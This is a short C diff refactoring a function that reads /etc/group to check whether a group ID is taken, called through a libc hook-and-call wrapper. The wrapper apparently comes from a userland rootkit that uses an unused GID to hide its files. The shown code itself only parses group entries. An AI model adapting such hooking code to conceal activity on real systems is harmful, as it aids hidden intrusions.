@@ -2,7 +2,7 @@ int gidtaken(gid_t newgid){
     hook(CFOPEN);
     FILE *fp = call(CFOPEN, "/etc/group", "r");
     if(fp == NULL)
-        return 0;
+        return -1;
 
     char line[LINE_MAX], *linedup, *linetok;
     int taken=0, c=0;
@@ -15,13 +15,11 @@ int gidtaken(gid_t newgid){
         linedup = strdup(line);
         linetok = strtok(linedup, ":");
 
-        while(linetok != NULL){
+        while(linetok != NULL && taken != 1){
             if(c++ == 2){
                 curgid = (gid_t)atoi(linetok);
-                if(curgid == newgid){
+                if(curgid == newgid)
                     taken = 1;
-                    break;
-                }
             }
             linetok = strtok(NULL, ":");
         }
